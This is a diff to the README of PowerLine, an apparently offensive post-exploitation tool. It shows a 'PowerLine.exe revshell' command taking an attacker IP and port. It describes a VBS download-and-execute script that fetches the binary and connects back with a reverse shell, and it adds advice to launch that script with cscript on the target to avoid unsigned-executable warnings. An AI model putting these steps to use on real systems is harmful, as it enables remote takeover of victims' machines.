@@ -131,8 +131,10 @@ PowerLine.exe revshell "revshell -hostip <attackers IP> -port <desired port>"
 
 **PowerLine.vbs**
 
-This is just a handy download and execute script for the PowerLine.exe. You will need to edit the script to have the correct IP address to download PowerLine.exe from and to connect back to for the reverse shell.
+This is just a handy download and execute script for the PowerLine.exe. You will need to edit the script to have the correct IP address to download PowerLine.exe from and to have the correct IP address to connect back to for the reverse shell.
 
+You would want to run the PowerLine.vbs script from a CMD shell on the target like this, otherwise, if you just run it from the browser, you will get prompts about how it is an executable and how it is not signed etc..:
+c:\users\username\Downloads>cscript PowerLine.vbs
 
 ## Troubleshooting
 
